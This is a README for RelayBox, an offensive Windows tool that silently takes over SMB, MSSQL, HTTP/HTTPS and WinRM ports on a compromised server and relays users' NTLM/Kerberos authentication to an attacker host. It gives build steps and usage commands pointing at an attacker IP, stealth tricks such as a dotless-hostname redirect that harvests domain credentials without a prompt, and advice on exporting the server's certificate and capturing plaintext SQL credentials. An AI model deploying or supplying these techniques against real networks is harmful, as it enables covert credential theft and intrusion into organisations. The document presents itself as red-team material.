# RelayBox - Man-In-The-Service tool to turn servers against their admins

RelayBox is a tool that allows Red Teamers to silently place themselves in-between legitimate Windows servers without disrupting the latter. Its main purpose is to be able to, from a compromised server running the tool, relay incoming authentication attempts to other resources in the network without arising any suspicion.

**Must be used with:** ntlmrelayx (https://github.com/fortra/impacket) or krbrelayx (https://github.com/dirkjanm/krbrelayx)

## Building

The project now follows the conventional `cmd/` + `pkg/` layout. Build the binary with:

```bash
GOOS=windows go build -o relaybox.exe ./cmd/relaybox
```

You can also find prebuilt binaries on the Releases page.

## Why?

NTLM and Kerberos relaying attacks are really powerful, however often times can be impractical, too noisy or too disruptive. This is because at times it is not enough to (or we simply aren't able to):
- Poison name resolution
- Exploit RPC functions to coerce machine accounts
- Deliver user coercion payloads

Additionally, **oftentimes the best relay point** (the machine we control and "harvest" auth attempts from) **is a server that is used by many users**. The logic is quite clear, more users making connections to a machine `==` more authentication attemps `==` higher chance to get the accounts we need.

SpecterOps published a method to take over port 445 in their [Relay You Heart Away](https://www.x33fcon.com/slides/x33fcon24_-_Nick_Powers_-_Relay_Your_Heart_Away_An_OPSEC-Conscious_Approach_to_445_Takeover.pdf) talk. This research was amazing, however there is a clear issue with this: if we want the best relay vantage point, a busy file server is the best target, if we kill SMB everybody will notice and we will be disrupting pontentially critical processes.

Also, why stop and SMB? Let's see if we can take over all Windows services, silently!

## How it works

Each protocol has its own module that achieves the following:
- Rebind legitimate service to only local loopback
- Start our own service on original port on all other interfaces
- Create firewall rule for it
- Upon user connection proxy everything to a remote host (this will be the one running `ntlmrelayx` and such)
- Kill the connection
- Upon re-connection (most clients for these services will auto-reconnect) proxy everything to legitimate service running on local loopback

If you want more details about how this is achieved for each different service, checkout the "Services" section. 

## Usage

**This tool requires and is really only useful with local-admin privileges**

```
Usage of C:\tmp\relaybox.exe:
  -http
        Enable HTTP relay
  -iface string
        Specific interface to bind rogue to, defaults to all interfaces
  -mssql
        Enable MSSQL relay
  -pfx string
        File path of PFX file to run HTTPS proxy
  -pfx-pass string
        Password of PFX file to run HTTPS proxy
  -raddr string
        Remote host to forward to (will match port bound for rogue service)
  -smb
        Enable SMB relay
  -verbose
        Enable verbose logging
  -winapi
        Use Windows API to shut down smb service, default will kill with powershell command
  -winrm
        Enable WinRM relay
  -mssql-smb
        Enable MSSQL relay via named pipes, will also run smb proxy
```

Remember `-raddr` should be an attacker controlled machine running `ntlmrelayx.py`, this means that either that machine has direct network access to the relay targets, or you need to setup socks proxying between your attacker machine and the compromised server. Some tools to achieve this:
- https://github.com/jpillora/chisel
- https://github.com/Nicocha30/ligolo-ng

### Take over SMB

```bash
./relaybox.exe -raddr 10.10.14.11 -smb
```

This will take over port 445 on all interfaces except localhost. Whenever a new client connects, the authentication phase gets proxied to `raddr`, then the connection is dropped. Once the client re-connects it will be proxied to the original SMB service running on localhost.

### Take over MSSQL via named pipes

```bash
./relaybox.exe -raddr 10.10.14.11 -mssql-smb
```

This will hijack all incoming MSSQL connections to force them to use Named Pipes for communicating with the database. It will also enable the SMB takeover as if `-smb` would be running. This will result in all incoming MSSQL connection to be transparently man-in-the-middled and available for relay from your `-raddr`.

### Take over HTTP

```bash
./relaybox.exe -raddr 10.10.14.11 -http
```

This will rebind all IIS listeners to localhost, then setup an http server that:
- Upon first connection redirects to the dotless version of the hostname (http://website.domain.local -> http://website) so that domain credentials are sent without showing a popup to the user.
- After redirection the NTLM challenge response is proxied to the `-raddr`
- A cookie `AuthProxy` is set so that redirection will not happen again
- Victim is taken back to the original page they visited
This allows to transparently relay a victim visiting a site to LDAP or another HTTP server on the network.

### Take over HTTPS

```bash
./relaybox.exe -raddr 10.10.14.11 -http -pfx server.pfx -pfx-pass '1234'
```

This behaves exactly like the HTTP takeover, except it will use a provided PFX file and password to create an HTTPS version of the attack as well. You whould extract the PFX from the compromised server so that it is as legitimate as possible. You can find a powershell utility to do this in: [http/export-pfx.ps1](http/export-pfx.ps1).

### Take over MSSQL (experimental)

```bash
./relaybox.exe -raddr 10.10.14.11 -mssql
```

This will actually take over port 1433 and rebind the MSSQL service to run only on localhost. Just like with the SMB takeover, the first connection from a client will be proxied to the `-raddr` and can be used for relay, then the proxy will point to the legitimate MSSQL service running on localhost.

This is marked as experimental because the exact number of connections before stopping to relay isn't yet clear for most MSSQL clients, and because MSSQL->MSSQL relaying is not yet a thing even in ntlmrelayx (https://github.com/fortra/impacket/issues/816).

**Note** this is really good for capturing plaintext credentials when clients are doing SQL auth.

### Take over WINRM

```bash
./relaybox.exe -raddr 10.10.14.11 -winrm
```

This will take over port 5985, using this will affect IIS services as well, so you should probably run this with `-http` as well if an HTTP service is exposed on the compromised server. This will proxy the first connection to the `-raddr` and then to the legitimate service running on localhost. 

WinRM is not a really good candidate for relaying as there are a lot of pre-conditions for the target to be vulnerable: https://sensepost.com/blog/2025/is-tls-more-secure-the-winrms-case./ . However, nothing's sopping you from capturing all traffic for a nice network based WinRM keylogger... until someone figures out WinRM relaying properly. 

## TODO

- MSSQL both named pipe and tcp server mitm simultaneously
- RPC implementation to take over port 135
- Add built-in name resolution poisoning
- Implement all system calls via Windows API instead of Powershell
- Auto detect and extract .pfx for HTTPS takeover
- Investigate ADFS relaying: https://www.praetorian.com/blog/relaying-to-adfs-attacks/
- Perhpas take inspiration for more HTTP implementations from: https://github.com/praetorian-inc/ADFSRelay
